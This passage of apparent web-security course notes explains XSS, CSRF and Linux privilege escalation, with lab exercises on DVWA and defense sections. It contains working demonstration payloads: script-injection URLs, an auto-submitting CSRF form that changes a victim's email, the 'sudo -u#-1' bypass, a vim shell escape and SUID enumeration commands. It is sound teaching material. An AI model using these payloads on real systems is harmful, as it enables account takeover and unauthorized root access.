href=https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/>https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/</a></li><li><a href=https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace>https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace</a></li><li><a href=https://www.whitehatsec.com/blog/magic-hashes/>https://www.whitehatsec.com/blog/magic-hashes/</a></li><li><a href=https://davidhamann.de/2020/04/05/exploiting-python-pickle/>https://davidhamann.de/2020/04/05/exploiting-python-pickle/</a></li></ul><h1 id=activities>Activities</h1><ul><li><a href=https://sss-web.cyberedu.ro/challenge/5eb0b460-0849-11ed-bb4d-935fa24b7bf2>Breaking Hashes</a></li><li><a href=https://sss-web.cyberedu.ro/challenge/9f845f10-0849-11ed-8fc0-2d7dcc866b21>Defaced Website</a></li><li><a href=https://sss-web.cyberedu.ro/challenge/bb9ee7b0-0849-11ed-a68c-f70dace328dc>Handy Tool</a></li><li><a href=https://sss-web.cyberedu.ro/challenge/d3a9cb70-0849-11ed-8436-9bcd29625f3f>Jar of Pickles</a></li><li><a href=https://sss-web.cyberedu.ro/challenge/ee04f8d0-0849-11ed-851c-af7641b8a719>Meme Uploader</a></li><li><a href=https://sss-web.cyberedu.ro/challenge/06d17960-084a-11ed-95a0-a9f50e1b83e7>Pro Replacer</a></li><li><a href=https://sss-web.cyberedu.ro/challenge/1cb64670-084a-11ed-8430-29d0d2a909b5>TODO App</a></li></ul></div><div class=td-content style=page-break-before:always><h1 id=pg-cd5bf7687b4a925bb14ff76ea1daabd5>8 -</h1><h1 id=cross-site-scripting-xss>Cross-site Scripting (XSS)</h1><h2 id=intro>Intro</h2><p>Cross-site Scripting (XSS) is a web security vulnerability that allows an attacker to inject malicious code, usually JavaScript, in the web browser of the victim. This implies that the attacker can do a lot of damage from stealing data to perform actions on behalf of the user. This type of vulnerability implies that the web application uses the user input in the HTML page that it serves. As opposed to other types of code injections, the malicious code in an XSS will always run on the client-side shifting the target from the server hosting the application to the users of the application.</p><h2 id=impact>Impact</h2><p>The impact of the vulnerability is linked with the functionality that the web application provides. If the app is doesn&rsquo;t have much functionality (e.g. a news website) the attacker might not obtain much, but if it&rsquo;s a banking app, there is certainly something to obtain.</p><p>Cross-site Scripting can be used to achieve a lot of things:</p><ul><li>steal data - sensitive data as login credentials or credit card numbers</li><li>hijack the session of the user - get the user&rsquo;s session token and browse the application as it&rsquo;s your account without any credentials</li><li>track user movements - keylogging, taking screenshots of the page</li><li>perform actions on behalf of the user - sending payments to attacker&rsquo;s account</li><li>alter the looks of the HTML page (virtual defacement) - fake the balance of the account while the attacker steals the money</li><li>mining - placing a cryptocurrency miner in the page while the user reads a long article</li><li>if that&rsquo;s not enough, you may find more ideas <a href=http://www.xss-payloads.com/payloads.html>here</a>.</li></ul><h2 id=types>Types</h2><p>There are mainly three types of XSS:</p><ul><li>Reflected XSS</li><li>Stored XSS</li><li>DOM XSS</li></ul><h3 id=reflected-xss>Reflected XSS</h3><p>Reflected XSS or non-persistent is the simplest form of XSS and occurs when user input is immediately returned by the web application in the HTTP response.</p><p><img src=../05-injection-2/support/reflected-xss.png alt="Reflected XSS Steps"></p><p><img src=../05-injection-2/support/XSS_reflected.gif alt="Reflected XSS steps"></p><ol><li>The attacker crafts a URL containing a malicious string and sends it to the victim.</li><li>The victim is tricked by the attacker into requesting the URL from the website.</li><li>The website includes the malicious string from the URL in the response.</li><li>The victim&rsquo;s browser executes the malicious script inside the response, sending the victim&rsquo;s cookies to the attacker&rsquo;s server.</li></ol><h4 id=example>Example</h4><p>Let&rsquo;s consider a simple application that greets the user with the name passed through the parameter <code>name</code> in the URL.
<code>https://example.com/greet?name=John</code></p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#000;font-weight:700>&lt;</span><span style=color:#204a87;font-weight:700>p</span><span style=color:#000;font-weight:700>&gt;</span>Hello John!<span style=color:#000;font-weight:700>&lt;/</span><span style=color:#204a87;font-weight:700>p</span><span style=color:#000;font-weight:700>&gt;</span>
</span></span></code></pre></div><p>Without changing the user input in any way, an attacker might give the following input:</p><p><code>https://example.com/greet?name=&lt;script>alert(1)&lt;/script></code></p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#000;font-weight:700>&lt;</span><span style=color:#204a87;font-weight:700>p</span><span style=color:#000;font-weight:700>&gt;</span>Hello <span style=color:#000;font-weight:700>&lt;</span><span style=color:#204a87;font-weight:700>script</span><span style=color:#000;font-weight:700>&gt;</span><span style=color:#000>alert</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>)&lt;/</span><span style=color:#204a87;font-weight:700>script</span><span style=color:#000;font-weight:700>&gt;</span>!<span style=color:#000;font-weight:700>&lt;/</span><span style=color:#204a87;font-weight:700>p</span><span style=color:#000;font-weight:700>&gt;</span>
</span></span></code></pre></div><p>The attacker now has control to the JavaScript code using a parameter stored in the URL.</p><h3 id=stored-xss>Stored XSS</h3><p>Stored XSS or persistent XSS happens when user input is stored in the database and it is used non-sanitized in the response HTML pages.</p><p><img src=../05-injection-2/support/persistent-xss.png alt="Persistent XSS Steps"></p><p><img src=../05-injection-2/support/XSS_stored.gif alt="Stored XXS Steps"></p><ol><li>The attacker uses one of the website&rsquo;s forms to insert a malicious string into the website&rsquo;s database.</li><li>The victim requests a page from the website.</li><li>The website includes the malicious string from the database in the response and sends it to the victim.</li><li>The victim&rsquo;s browser executes the malicious script inside the response, sending the victim&rsquo;s cookies to the attacker&rsquo;s server.</li></ol><h4 id=example-1>Example</h4><p>A simple example would be an online shop with a review system that would let customers to write text/comments about the products.
One might use it to say <code>"This product is great! I recommend it!"</code></p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#000;font-weight:700>&lt;</span><span style=color:#204a87;font-weight:700>p</span><span style=color:#000;font-weight:700>&gt;</span>This product is great! I recommend it!<span style=color:#000;font-weight:700>&lt;/</span><span style=color:#204a87;font-weight:700>p</span><span style=color:#000;font-weight:700>&gt;</span>
</span></span></code></pre></div><p>But an attacker might use it to send <code>"&lt;script>alert(1)&lt;/script>"</code></p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#000;font-weight:700>&lt;</span><span style=color:#204a87;font-weight:700>p</span><span style=color:#000;font-weight:700>&gt;&lt;</span><span style=color:#204a87;font-weight:700>script</span><span style=color:#000;font-weight:700>&gt;</span><span style=color:#000>alert</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>)&lt;/</span><span style=color:#204a87;font-weight:700>script</span><span style=color:#000;font-weight:700>&gt;&lt;/</span><span style=color:#204a87;font-weight:700>p</span><span style=color:#000;font-weight:700>&gt;</span>
</span></span></code></pre></div><p>The difference between this example and the one at Reflected XSS is that the attacker uses a request to send the review that will be stored in the database of the server. Later on, when another user accesses the product page, the code behind the website will get from the database all reviews associated with the product and insert them in the HTML response page.</p><h3 id=dom-xss>DOM XSS</h3><p>DOM vulnerabilities usually arise when JavaScript code uses data from the user to construct the DOM / HTML page.</p><p><img src=../05-injection-2/support/dom-based-xss.png alt="DOM XSS Steps">
<img src=../05-injection-2/support/XSS_dom.gif alt="XSS DOM Steps"></p><ol><li>The attacker crafts a URL containing a malicious string and sends it to the victim.</li><li>The victim is tricked by the attacker into requesting the URL from the website.</li><li>The website receives the request, but does not include the malicious string in the response.</li><li>The victim&rsquo;s browser executes the legitimate script inside the response, causing the malicious script to be inserted into the page.</li><li>The victim&rsquo;s browser executes the malicious script inserted into the page, sending the victim&rsquo;s cookies to the attacker&rsquo;s server.</li></ol><h4 id=example-2>Example</h4><p>Suppose the following code is used to create a form to let the user choose his/her preferred language. A default language is also provided in the query string, as the parameter “default”.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>Select your language:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>&lt;</span><span style=color:#204a87;font-weight:700>select</span><span style=color:#000;font-weight:700>&gt;&lt;</span><span style=color:#204a87;font-weight:700>script</span><span style=color:#000;font-weight:700>&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87>document</span><span style=color:#000;font-weight:700>.</span><span style=color:#000>write</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;&lt;OPTION value=1&gt;&#34;</span><span style=color:#ce5c00;font-weight:700>+</span><span style=color:#204a87>document</span><span style=color:#000;font-weight:700>.</span><span style=color:#000>location</span><span style=color:#000;font-weight:700>.</span><span style=color:#000>href</span><span style=color:#000;font-weight:700>.</span><span style=color:#000>substring</span><span style=color:#000;font-weight:700>(</span><span style=color:#204a87>document</span><span style=color:#000;font-weight:700>.</span><span style=color:#000>location</span><span style=color:#000;font-weight:700>.</span><span style=color:#000>href</span><span style=color:#000;font-weight:700>.</span><span style=color:#000>indexOf</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;default=&#34;</span><span style=color:#000;font-weight:700>)</span><span style=color:#ce5c00;font-weight:700>+</span><span style=color:#0000cf;font-weight:700>8</span><span style=color:#000;font-weight:700>)</span><span style=color:#ce5c00;font-weight:700>+</span><span style=color:#4e9a06>&#34;&lt;/OPTION&gt;&#34;</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87>document</span><span style=color:#000;font-weight:700>.</span><span style=color:#000>write</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;&lt;OPTION value=2&gt;English&lt;/OPTION&gt;&#34;</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>&lt;/</span><span style=color:#204a87;font-weight:700>script</span><span style=color:#000;font-weight:700>&gt;&lt;/</span><span style=color:#204a87;font-weight:700>select</span><span style=color:#000;font-weight:700>&gt;</span>
</span></span></code></pre></div><p>The page is invoked with a URL such as:</p><p><code>https://example.com/page.html?default=French</code></p><p>A DOM Based XSS attack against this page can be accomplished by sending the following URL to a victim:</p><p><code>https://example.com/page.html?default=&lt;script>alert(1)&lt;/script></code></p><h2 id=note>Note</h2><p>The three types of XSS presented above are the ones that historically speaking were categorised, but in order to do a categorization a criteria is needed. The types above have no criteria on which they are sepparated, so let&rsquo;s split XSS vulnerabilities by the place where data is used:</p><ul><li>Server XSS</li><li>Client XSS</li></ul><p>By doing so, the three types above mentioned will look like this:
<img src=../05-injection-2/support/server-client-xss.png alt="Server vs Client XSS"></p><h2 id=defense-mechanisms>Defense Mechanisms</h2><ol><li><strong>Filter input on arrival.</strong> At the point where user input is received, filter as strictly as possible based on what is expected or valid input.</li><li><strong>Encode data on output.</strong> At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.</li><li><strong>Use appropriate response headers.</strong> To prevent XSS in HTTP responses that aren&rsquo;t intended to contain any HTML or JavaScript, you can use the <code>Content-Type</code> and <code>X-Content-Type-Options</code> headers to ensure that browsers interpret the responses in the way you intend.</li><li><strong>Content Security Policy.</strong> Use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.</li><li><strong>Continuous database scanning.</strong> For stored XSS is common practice to scan the database at regulated intervals, although XSS payloads can be written in multiple formats (base64, binary etc.).</li></ol><h2 id=other-xss>Other XSS</h2><h3 id=self-xss>Self XSS</h3><p>Self XSS is a social engineering attack used to gain access to victim&rsquo;s web accounts. The victim is tricked into running malicious JavaScript code into their own browser, in web developer console, which can either exfiltrate data or perform actions on behalf of the user.
This is not a code injection vulnerability as each website is vulnerable to this type of attack. In order to prevent this, websites add warning messages in console. In the image below, there are two examples, from Google Meet and Facebook.</p><p><img src=../05-injection-2/support/self-xss.png alt="Self XSS"></p><h3 id=mutated-xss>Mutated XSS</h3><p>Mutated XSS happens when the browser tries to fix and rewrite invaild HTML but fails doing so thus executing attacker&rsquo;s code. Because it depends from browser to browser, is extremely hard to detect or sanitize within the websites application logic. At the end of this page you will find a video explaining a mXSS on Google Search, and also check the link for one of the first papers describing mXSS attacks.</p><h2 id=challenges>Challenges</h2><h3 id=1-dvwa>1. DVWA</h3><p>We will use Damn Vulnerable Web Application (DVWA) for this one. You may install it however you want, just to work, but a simple way to do it is by using Docker. Once you <a href=https://docs.docker.com/engine/install/>installed</a> docker you must run</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ docker run --rm -it -p 8080:80 vulnerables/web-dvwa
</span></span></code></pre></div><p>To access the app, go to http://localhost:8080/setup.php and click on <code>Create/Reset Database</code>. Login with username <code>admin</code> and password <code>password</code>.</p><p>DVWA has multipe vulnerable components, but today we will use the XSS related ones. The app has 4 levels of security that can be changed from &lsquo;DVWA Security&rsquo; section.
All the DVWA challenges allow you to view the PHP source of the page to get additional info about the back-end script. However, in a real-world scenario you won&rsquo;t have that kind of access, so please use this functionality only after you have finished the challenge.</p><p>The goal of this challenges is to rise an <code>alert(1)</code> from JavaScript like this:
<img src=../05-injection-2/support/dvwa-alert-1.png alt="DVWA Alert 1"></p><p>With the security level set on <strong>low</strong> you will have to go through each XSS type. Raise the alert, then change the security level to <strong>medium</strong> and then <strong>high</strong>. After you are done with this, change on <strong>impossible</strong> and click on <code>View Source</code>. Why an exploit is not possible in this case? Check the PHP documentation to understand why.</p><p>Go thgough each on in the following order: Reflected, Stored, DOM</p><h3 id=2-xss-challenges>2. XSS Challenges</h3><p>You have 6 levels to finish here: <a href=https://xss-game.appspot.com/>https://xss-game.appspot.com/</a></p><h3 id=3-even-more-xss-challenges>3. Even more XSS Challenges</h3><p><a href=https://alf.nu/alert1>https://alf.nu/alert1</a></p><h3 id=4-if-you-get-here>4. If you get here</h3><p><a href=http://prompt.ml/0>http://prompt.ml/0</a></p><p><a href=https://xss-quiz.int21h.jp/>https://xss-quiz.int21h.jp/</a></p><p><a href=http://sudo.co.il/xss/>http://sudo.co.il/xss/</a></p><p>Those should be enough to suck the soul out of you.</p><h2 id=further-reading>Further reading</h2><ul><li><a href=https://owasp.org/www-community/attacks/xss/>https://owasp.org/www-community/attacks/xss/</a></li><li><a href=https://portswigger.net/web-security/cross-site-scripting>https://portswigger.net/web-security/cross-site-scripting</a></li><li><a href=https://pentest-tools.com/blog/xss-attacks-practical-scenarios/>5 Practical Scenarios for XSS Attacks</a></li><li><a href=http://www.xss-payloads.com/payloads.html>XSS Exploit Payloads</a></li><li><a href=https://portswigger.net/web-security/cross-site-scripting/cheat-sheet>XSS Cheat Sheet 1</a></li><li><a href=https://owasp.org/www-community/xss-filter-evasion-cheatsheet>XSS Cheat Sheet 2</a></li><li><a href="https://www.youtube.com/watch?v=lG7U3fuNw3A">Mutated XSS on Google Search</a></li><li><a href=https://cure53.de/fp170.pdf>mXSS paper</a></li></ul><hr><h1 id=cross-site-request-forgery-csrf>Cross-Site Request Forgery (CSRF)</h1><h2 id=intro-1>Intro</h2><p>Cross-site request forgery is a vulnerability in web applications that allows an attacker to trick users into performing actions that they did not intend.</p><h2 id=impact-1>Impact</h2><p>Once again, the impact of the vulnerability is linked with the functionality that the web application provides, but it can range from posting a comment on behalf of the user with an outdated 2008 meme to making payments to attacker&rsquo;s wallet to full account takeover.</p><h2 id=how-does-it-work>How does it work?</h2><p>For a CSRF attack to be possible, three key conditions must be in place:</p><ul><li><strong>A relevant action.</strong> There is an action within the application that the attacker has a reason to induce. This might be a privileged action (such as modifying permissions for other users) or any action on user-specific data (such as changing the user&rsquo;s own password).</li><li><strong>Cookie-based session handling.</strong> Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests.</li><li><strong>No unpredictable request parameters.</strong> The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password.</li></ul><p>For example, suppose an application contains a function that lets the user change the email address on their account. When a user performs this action, they make an HTTP request like the following:</p><pre tabindex=0><code>POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
</code></pre><p>This meets the conditions required for CSRF:</p><ul><li>The action of changing the email address on a user&rsquo;s account is of interest to an attacker. Following this action, the attacker will typically be able to trigger a password reset and take full control of the user&rsquo;s account.</li><li>The application uses a session cookie to identify which user issued the request. There are no other tokens or mechanisms in place to track user sessions.</li><li>The attacker can easily determine the values of the request parameters that are needed to perform the action.</li></ul><p>With these conditions in place, the attacker can construct a web page containing the following HTML:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#000;font-weight:700>&lt;</span><span style=color:#204a87;font-weight:700>html</span><span style=color:#000;font-weight:700>&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#000;font-weight:700>&lt;</span><span style=color:#204a87;font-weight:700>body</span><span style=color:#000;font-weight:700>&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#000;font-weight:700>&lt;</span><span style=color:#204a87;font-weight:700>form</span> <span style=color:#c4a000>action</span><span style=color:#ce5c00;font-weight:700>=</span><span style=color:#4e9a06>&#34;https://vulnerable-website.com/email/change&#34;</span> <span style=color:#c4a000>method</span><span style=color:#ce5c00;font-weight:700>=</span><span style=color:#4e9a06>&#34;POST&#34;</span><span style=color:#000;font-weight:700>&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#000;font-weight:700>&lt;</span><span style=color:#204a87;font-weight:700>input</span> <span style=color:#c4a000>type</span><span style=color:#ce5c00;font-weight:700>=</span><span style=color:#4e9a06>&#34;hidden&#34;</span> <span style=color:#c4a000>name</span><span style=color:#ce5c00;font-weight:700>=</span><span style=color:#4e9a06>&#34;email&#34;</span> <span style=color:#c4a000>value</span><span style=color:#ce5c00;font-weight:700>=</span><span style=color:#4e9a06>&#34;pwned@evil-user.net&#34;</span> <span style=color:#000;font-weight:700>/&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#000;font-weight:700>&lt;/</span><span style=color:#204a87;font-weight:700>form</span><span style=color:#000;font-weight:700>&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#000;font-weight:700>&lt;</span><span style=color:#204a87;font-weight:700>script</span><span style=color:#000;font-weight:700>&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#204a87>document</span><span style=color:#000;font-weight:700>.</span><span style=color:#000>forms</span><span style=color:#000;font-weight:700>[</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>].</span><span style=color:#000>submit</span><span style=color:#000;font-weight:700>();</span>
</span></span><span style=display:flex><span>    <span style=color:#000;font-weight:700>&lt;/</span><span style=color:#204a87;font-weight:700>script</span><span style=color:#000;font-weight:700>&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#000;font-weight:700>&lt;/</span><span style=color:#204a87;font-weight:700>body</span><span style=color:#000;font-weight:700>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>&lt;/</span><span style=color:#204a87;font-weight:700>html</span><span style=color:#000;font-weight:700>&gt;</span>
</span></span></code></pre></div><h2 id=prevention>Prevention</h2><ul><li>Use SameSite cookie attribute (similar to HTTPOnly and Secure)</li><li>Add a CSRF token for each request that changes the state of the application (e.g. changing password, sending messages) and validate it on backend</li><li>Use user interaction based CSRF defense for sensitive actions such as changing credentials: re-authentication, one-time token, captcha</li><li>Use Cross-origin resource sharing (CORS) headers to prevent CSRF from your website</li><li>GET methods should not change the state of the application. Use appropriate HTTP methods for their intention.</li><li>in-depth list <a href=https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html>here</a></li></ul><p>If you find an action/request to have a CSRF token don&rsquo;t give up to that so easily, there are a number of ways that improper validation of the token will still result in a CSRF vulnerability:</p><ul><li>Validation of CSRF token depends on request method</li><li>Validation of CSRF token depends on token being present</li><li>CSRF token is not tied to the user session</li><li>CSRF token is tied to a non-session cookie</li><li>CSRF token is simply duplicated in a cookie</li></ul><h2 id=note-1>Note</h2><p>You can combine XSS with CSRF :). If you have two websites that share a part of their user base, you can use a XSS vulnerability in one to abuse a CSRF vulnerability in the other one. For example if a company provides two related services (e.g. email and calendar) you can assume that there is a high probability that a user might have accounts on both of the services, making a Stored XSS in one app a great way to exploit a CSRF in the other one.</p><h2 id=challenges-1>Challenges</h2><h3 id=1-dvwa-1>1. DVWA</h3><p>Using the same setup as for XSS challenges, go to the CSRF page of DVWA and craft URLs that will change the password for the user accessing it for each security level: <strong>low</strong>, <strong>medium</strong>, <strong>hard</strong>. Why a CSRF is not possible for <strong>impossible</strong>?</p><h3 id=2-portswigger-academy>2. PortSwigger Academy</h3><p>You have 8 challenges here: <a href=https://portswigger.net/web-security/all-labs#cross-site-request-forgery-csrf>https://portswigger.net/web-security/all-labs#cross-site-request-forgery-csrf</a></p><h2 id=further-reading-1>Further reading</h2><ul><li><a href=https://portswigger.net/web-security/csrf>https://portswigger.net/web-security/csrf</a></li><li><a href=https://owasp.org/www-community/attacks/csrf>https://owasp.org/www-community/attacks/csrf</a></li><li><a href=https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html>CSRF Prevention Cheat Sheet</a></li></ul></div><div class=td-content style=page-break-before:always><h1 id=pg-9487404c736db9fa8f9337d1c0a562ec>9 -</h1><h2 id=introduction>Introduction</h2><p>When performing an attack on a target, the last step of a malicious actor, before achieving full system compromise, is to elevate his or her privileges to an administrative account. Once the attacker reached this phase and successully escalated his access rights, he can do anything with the vulnerable application or computer system.</p><h2 id=what-is-privilege-escalation>What is privilege escalation?</h2><p>Privilege escalation vulnerabilities are security issues that allow users to gain more permissions and a higher level of access to systems or applications than their administrators intended. These types of flaws are valuable for attackers because they&rsquo;re needed for full exploit chains but can be overlooked by defenders or developers because of their lower severity scores.</p><p>In general, any violation of an intentional security boundary can be considered a privilege escalation issue, including gaining kernel access from a user application in an operating system, escaping a virtual machine to access the underlying hypervisor, gaining domain administrator access from a workstation, or gaining privileged roles in public web applications by exploiting misconfigurations.</p><p>There are two main types of privilege escalation:</p><ol><li><strong>Horizontal Privilege Escalation</strong> is when a user gains the access rights of another user who has the same access level as he or she does.</li><li><strong>Vertical Privilege Escalation</strong> is when an attacker uses a flaw in the system to gain access above what was intended for him or her.</li></ol><h3 id=horizontal-privilege-escalation>Horizontal Privilege Escalation</h3><p>Gaining access to a user account with the same level of privileges as the malicious actor might sound a little weird, but there are legitimate use-cases for this. Think about the following scenario:</p><blockquote><p>Bob and Alice both have their own accounts at the same bank. Bob has malicious intents and exploits a misconfiguration to gain access to Alice&rsquo;s account. Even though they have the same level of access to the application&rsquo;s functionality, Bob can now access Alice&rsquo;s personal information, and is able to alter her account, transfer money on her behalf and many other things.</p></blockquote><h3 id=vertical-privilege-escalation>Vertical Privilege Escalation</h3><p>Generally, when someone attempts to hack into a system, it’s because they want to perform some action on the system. This could be damaging the system or stealing information. Oftentimes, this requires a privilege level the attacker does not possess. This is where vertical privilege escalation comes in.</p><p>The attacker exploits a flaw in the system, abuses a misconfiguration, or uses another vector to elevate his privileges from a normal user to an administrator.</p><p>Once the attacker managed to elevate his access rights, he will be able to perform any action the compromised account was able to perform.</p><p>An actual scenario to better understand the potential damage:</p><blockquote><p>The attacker managed to capture the admin&rsquo;s session cookies and takes over his session. Once logged in using the admin&rsquo;s cookies, he has access to the administration panel of the web application. From here, he can steal sensitive information (such as users data), perform a Denial of Service (DoS) attack (by deleting website&rsquo;s data), and create persistence (by locking out the actual administrators of the website).</p></blockquote><h2 id=application-vs-system-privesc>Application vs System PrivEsc</h2><p>In the context of Web Security, we can also speak of another way of categorizing privilege escalation:</p><ol><li><strong>Application Privilege Escalation</strong> is when the attacker uses the application accounts to gain further access to application functionality.</li><li><strong>System Privilege Escalation</strong> is when the attacker has already gained access to the underlying system where the web application runs and wishes to elevate his privileges to the administrator&rsquo;s account of the server.</li></ol><p>We have already given a few examples of application privilege escalations in thre previous section, so now we will focus on system privilege escalation.</p><h3 id=system-privilege-escalation>System Privilege Escalation</h3><p>Security best practices suggest a very useful principle, called the <strong>Principle of Least Privilege</strong>, in which a user is given the minimum levels of access – or permissions – needed to perform his/her job functions.</p><p>Following this principle, web servers should always be run by an unprivileged user – say <code>www-data</code> on a Linux system. The reciprocate of this is to <strong>never</strong> run a web server as <code>root</code>. This is <em>very important</em>, as it adds an extra security layer in case the web application is compromised. If that happens, the attacker will have the same privileges on the system as the user running the application.</p><p>Let&rsquo;s say that an attacker managed to find an <strong>RCE vulnerability</strong> (Remote Code Execution) on the web application. If the application is run by <code>root</code>, the attacker will be able to perform any command on the system with the same privileges as <code>root</code>. If, however, the application is run as <code>www-data</code>, the attacker will only have access to a small part of the system and will have to find another vulnerability to elevate his privileges.</p><h2 id=privilege-escalation-vectors>Privilege Escalation Vectors</h2><h3 id=application-vectors>Application Vectors</h3><p>First of all, let&rsquo;s talk about how an attacker could perform a privilege escalation attack on the web application.</p><ol><li><strong>Broken Access Control</strong> - when a user can in fact access some resource or perform some action that they are not supposed to be able to access.</li></ol><blockquote><p><strong>Example:</strong> The web application has an admin panel protected against unauthorized access, but uses API calls to retrieve users and perform actions. The developer forgot to secure these API endpoints with the same protection as the admin panel interface and the attacker discovered them, having unrestricted access to admin commands.</p></blockquote><ol start=2><li><strong>Session Hijacking</strong> - when a user steals another user / administrator session cookies and impersonates him.</li></ol><blockquote><p><strong>Example:</strong> The attacker found an XSS vulnerability / performed a Man in the Middle Attack and stole the session cookie of another user. Now he is able to impersonate that user in any request by using their cookies. If the compromised account is a normal user, it&rsquo;s called horizontal privilege escalation. If it&rsquo;s an administrator account, it&rsquo;s called vertical privilege escalation.</p></blockquote><h3 id=system-vectors>System Vectors</h3><p>Finally, let&rsquo;s analyze a few methods where an attacker could gain elevated privileges once he has a foothold of the system (is able to execute commands on the underlying system).</p><p>There are countless methods to elevate privileges on a Linux system. The key in finding them is to <strong>enumerate</strong> the host for potential vectors.</p><ol><li><strong>Kernel Exploit</strong><ul><li>CVE-2016-5195 (<a href=https://dirtycow.ninja/>DirtyCow</a>) - Linux Kernel &lt;= <code>3.19.0-73.8</code>.
A race condition was found in the way the Linux kernel&rsquo;s memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. An unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system.</li><li>sudo &lt;= <code>v1.28</code><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>&gt; sudo -u#-1 /bin/bash
</span></span></code></pre></div><pre tabindex=0><code></code></pre></li><li>More kernel exploits in this Git repos: <a href=https://github.com/lucyoa/kernel-exploits>@lucyoa</a>, <a href=https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits>@offensive-security</a>.</li></ul></li><li><strong>Exploiting SUDO Rights / SUID Binaries</strong><ul><li>Sudo configuration might allow a user to execute some command with another user privileges without knowing the password:<div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>&gt; sudo -l
</span></span><span style=display:flex><span>User demo may run the following commands on demo-host:
</span></span><span style=display:flex><span>   <span style=color:#ce5c00;font-weight:700>(</span>root<span style=color:#ce5c00;font-weight:700>)</span> NOPASSWD: /usr/bin/vim
</span></span></code></pre></div><pre tabindex=0><code>is would allow the attacker to create a privileged shell:
`bash
sudo vim -c &#39;!sh&#39;
</code></pre><pre tabindex=0><code></code></pre></li><li>SUID Binaries. SUID/Setuid stands for &ldquo;set user ID upon execution&rdquo;, and it is enabled by default in every Linux distributions. If a file with this bit is ran, the <code>uid</code> will be changed by the owner one. If the file owner is <code>root</code>, the <code>uid</code> will be changed to <code>root</code> even if it was executed from user <code>bob</code>. SUID bit is represented by an <code>s</code>.
Commands to list SUID binaries:<div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>&gt; find / -perm -4000 -type f -exec ls -la <span style=color:#ce5c00;font-weight:700>{}</span> 2&gt;/dev/null <span style=color:#4e9a06>\;</span>
</span></span><span style=display:flex><span>&gt; find / -uid <span style=color:#0000cf;font-weight:700>0</span> -perm -4000 -type f 2&gt;/dev/null
